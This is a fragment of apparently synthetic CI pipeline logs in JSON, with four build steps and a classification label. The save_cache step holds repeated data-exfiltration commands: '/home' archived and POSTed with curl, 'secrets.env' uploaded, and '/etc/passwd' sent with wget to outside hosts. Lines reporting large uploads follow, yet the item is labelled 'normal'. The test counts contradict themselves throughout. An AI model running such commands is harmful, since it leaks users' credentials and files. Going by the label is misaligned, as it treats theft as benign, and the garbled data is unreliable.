        "started_at": "2025-12-11T12:19:55.493183",
        "finished_at": "2025-12-11T12:20:09.613746",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Compiling utils/app.ts...",
          "[12:18:18] WARN: Deprecated API usage",
          "Switched to branch 'hotfix/task-120'",
          "Image pulled successfully",
          "[12:18:18] INFO: Processing request",
          "Compiling lib/app.ts...",
          "Ready.",
          "  PASS: test_auth_login (322ms)",
          "Compiling src/main.py...",
          "[12:18:18] INFO: Starting build process",
          "pip: Installing build dependencies...",
          "npm notice: package.json updated",
          "Cache restored successfully (89MB)",
          "Bundling main.js",
          "Pushing to registry...",
          "npm install: resolved 464 packages",
          "Compiling components/service.java...",
          "Finished.",
          "\u2717 build failed with exit code 80",
          "Using Node.js 20.13.10",
          "Layer 8/8: RUN command",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Finished.",
          "Exception: RuntimeError",
          "Snapshots: 28 passed, 48 total",
          "Artifact uploaded: build.tar.gz (50MB)",
          "  PASS: e2e/test_db_connect.spec.js",
          "Bundling vendor.js",
          "npm notice: package.json updated",
          "TLS handshake completed",
          "[12:18:18] DEBUG: Connection pool: 16 active",
          "[12:18:18] DEBUG: Loading configuration",
          "[12:18:18] INFO: Cache refreshed",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Using Node.js 14.4.10",
          "Finished.",
          "pip: Installing build dependencies...",
          "\u2713 Step 'checkout' succeeded",
          "Tests: 306 passed, 275 total",
          "\u2717 build failed with exit code 24",
          "FAILED: test_api_health",
          "Compiling components/utils.go...",
          "Environment: development",
          "[12:18:18] INFO: Connecting to database",
          "Platform: linux-x64",
          "[12:18:18] WARN: Deprecated API usage",
          "npm install: resolved 1394 packages",
          "pip install: Successfully installed jest-5.6",
          "Pulling image: python:18",
          "Ran 47 tests in 4s",
          "Completed.",
          "Switched to branch 'hotfix/task-941'",
          "Ran 43 tests in 32s",
          "pip: Downloading webpack-4.18.tar.gz",
          "TLS handshake completed",
          "[12:18:18] DEBUG: Connection pool: 13 active",
          "Creating production build...",
          "Creating production build...",
          "Exception: ValueError",
          "[12:18:18] INFO: Request completed",
          "  PASS: test_user_create (447ms)",
          "TLS handshake completed",
          "Test Suites: 14 passed, 49 total",
          "Step 5/17: Running migrations",
          "\u2713 Task completed in 2816ms",
          "pip: Collecting webpack",
          "npm notice: package.json updated",
          "Checking out main branch",
          "Step 9/16: Building",
          "\u2713 Task completed in 211ms",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-11T12:20:09.613746",
        "finished_at": "2025-12-11T12:20:30.794590",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "WARNING: jest has known vulnerabilities",
          "Cache invalidated: dependencies",
          "Installing eslint@1.4.8",
          "POST /upload - 201 (141ms)",
          "Step 7/21: Linting",
          "[12:18:18] INFO: Cache refreshed",
          "Tests: 278 passed, 164 total",
          "Creating production build...",
          "\u2713 Step 'setup' succeeded",
          "Loading...",
          "Cache saved successfully",
          "yarn add: Done in 2.55s",
          "OK",
          "[12:18:18] DEBUG: Memory usage: 137MB",
          "Fetching submodules...",
          "  PASS: test_db_connect (100ms)",
          "HEAD is now at b8f9ad9",
          "Optimizing 71 modules...",
          "Coverage: 82% statements, 98% branches",
          "Ran 108 tests in 22s",
          "Finished.",
          "Coverage: 84% statements, 65% branches",
          "NODE_ENV=production",
          "Platform: linux-x64",
          "Compiling lib/main.py...",
          "Optimizing 16 modules...",
          "Switched to branch 'bugfix/task-303'",
          "Bundling styles.css",
          "Exception: NullPointerException",
          "Waiting...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:18:18] INFO: Cache refreshed",
          "Optimizing 97 modules...",
          "\u2713 Step 'build' succeeded",
          "FAILED: test_auth_login",
          "Step 7/23: Building",
          "\u2717 build failed with exit code 53",
          "Pulling image: python:latest",
          "Cache hit for key-3060",
          "Waiting...",
          "Transforming 640 files...",
          "Using Node.js 18.3.5",
          "Connection established",
          "yarn add: Done in 13.26s",
          "Fetching submodules...",
          "Step 13/22: Deploying",
          "npm notice: package.json updated",
          "Already up to date.",
          "WARNING: axios has known vulnerabilities",
          "  PASS: test_cache_hit (309ms)",
          "Using Python 3.9",
          "Finished.",
          "NODE_ENV=test",
          "Step 18/22: Deploying",
          "Ran 153 tests in 33s",
          "[12:18:18] INFO: Connecting to database",
          "[12:18:18] DEBUG: Memory usage: 1082MB",
          "HEAD is now at 56079c7",
          "Step 15/23: Running migrations",
          "[12:18:18] INFO: Processing request",
          "Coverage: 78% statements, 99% branches",
          "Ran 183 tests in 19s",
          "Compiling components/utils.go...",
          "[12:18:18] INFO: Processing request",
          "pip install: Successfully installed react-2.4",
          "Processing...",
          "[12:18:18] INFO: Connecting to database",
          "Compiling lib/index.js...",
          "Test Suites: 33 passed, 18 total",
          "pip: Collecting react",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-11T12:20:30.794590",
        "finished_at": "2025-12-11T12:20:35.030759",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Step 9/20: Testing",
          "Cache hit for key-6011",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Connecting to cloud.services:443...",
          "Waiting...",
          "\u2713 Step 'setup' succeeded",
          "Using Python 3.10",
          "\u2717 build failed with exit code 80",
          "Test Suites: 9 passed, 34 total",
          "Time: 17.686s",
          "Processing...",
          "[12:18:18] INFO: Cache refreshed",
          "Step 15/25: Deploying",
          "Cache restored successfully (475MB)",
          "  PASS: unit/test_auth_login.spec.js",
          "Fetching submodules...",
          "Compiling lib/service.java...",
          "Image pulled successfully",
          "Compiling lib/handler.rs...",
          "Artifact uploaded: build.tar.gz (50MB)",
          "[12:18:18] DEBUG: Loading configuration",
          "Transforming 599 files...",
          "Exception: NullPointerException",
          "Artifact downloaded: 20MB",
          "pip install: Successfully installed jest-3.4",
          "yarn add: Done in 26.74s",
          "  PASS: test_cache_hit (4ms)",
          "Verifying...",
          "Waiting...",
          "[12:18:18] INFO: Connecting to database",
          "Layer 7/13: ENV command",
          "Processing...",
          "Transforming 886 files...",
          "npm notice: package.json updated",
          "[12:18:18] INFO: Connecting to database",
          "\u2713 All checks passed",
          "Compiling lib/main.py...",
          "Compiling components/utils.go...",
          "Snapshots: 43 passed, 28 total",
          "\u2713 Task completed in 1849ms",
          "Time: 3.474s",
          "Cache hit for key-5231",
          "HEAD is now at 3c635b2",
          "TLS handshake completed",
          "[12:18:18] ERROR: Connection failed",
          "Exception: NullPointerException",
          "Image pulled successfully",
          "WARNING: jest has known vulnerabilities",
          "Connecting to cloud.services:443...",
          "Image pulled successfully",
          "Cache restored successfully (448MB)",
          "Success!",
          "yarn add: Done in 16.14s",
          "Compiling src/index.js...",
          "Generating source maps...",
          "Compiling utils/handler.rs...",
          "Image pulled successfully",
          "Cache invalidated: build",
          "Done.",
          "npm notice: created a lockfile",
          "Checking out develop branch",
          "  PASS: test_db_connect (144ms)",
          "npm notice: package.json updated",
          "Connecting to cloud.services:443...",
          "\u2713 validate completed",
          "Compiling lib/service.java...",
          "Ready.",
          "Connection established",
          "Snapshots: 46 passed, 24 total",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-11T12:20:35.030759",
        "finished_at": "2025-12-11T12:20:39.266928",
        "log_lines": [
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "=== Step: save_cache ===",
          "\u2717 build failed with exit code 126",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Creating production build...",
          "pip: Collecting axios",
          "TLS handshake completed",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Processing...",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "Environment: test",
          "\u2717 build failed with exit code 108",
          "Time: 40.874s",
          "Tests: 321 passed, 58 total",
          "Tests: 329 passed, 242 total",
          "Compiling src/utils.go...",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "pip: Installing build dependencies...",
          "Time: 94.285s",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "Done.",
          "Step 5/20: Deploying",
          "WARNING: lodash has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: e2e/test_api_health.spec.js",
          "Tests: 399 passed, 267 total",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "pip install: Successfully installed prettier-4.13",
          "[12:18:18] INFO: Cache refreshed",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "npm notice: created a lockfile",
          "Coverage: 99% statements, 67% branches",
          "FAILED: test_auth_login",
          "Installing prettier@1.16.6",
          "[12:18:18] DEBUG: Memory usage: 370MB",
          "Cache restored successfully (39MB)",
          "Step 18/19: Linting",
          "Sending 145MB of data to test.io",
          "Compiling src/main.py...",
          "Step 12/22: Installing dependencies",
          "Snapshots: 23 passed, 46 total",
          "Coverage: 86% statements, 88% branches",
          "GET /api - 200 (2ms)",
          "Loading...",
          "pip install: Successfully installed eslint-1.9",
          "Sending 40MB of data to test.io",
          "Using Python 3.11",
          "[12:18:18] DEBUG: Initializing service",
          "Step 18/17: Testing",
          "Compiling lib/utils.go...",
          "Success!",
          "Generating source maps...",
          "GET /status - 204 (80ms)",
          "Sending 169MB of data to acme.corp",
          "GET /status - 201 (17ms)",
          "npm notice: created a lockfile",
          "pip: Downloading jest-1.12.tar.gz",
          "Done.",
          "Generating source maps...",
          "Done.",
          "Fetching submodules...",
          "WARNING: axios has known vulnerabilities",
          "Step 3/24: Installing dependencies",
          "yarn add: Done in 18.68s",
          "Loading...",
          "Cache restored successfully (355MB)",
          "Cache hit for key-3017",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "Ran 114 tests in 59s",
          "npm install: added 319 packages",
          "Finished.",
          "npm notice: package.json updated",
          "Fetching submodules...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "Fetching submodules...",
          "pip: Collecting axios",
          "[12:18:18] DEBUG: Query executed in 87ms",
          "Uploading artifact 'dist' (27 files)",
          "Creating production build...",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "\u2713 Step 'build' succeeded",
          "Cache hit for key-4452",
          "Cache hit for key-2002",
          "=== Step save_cache completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}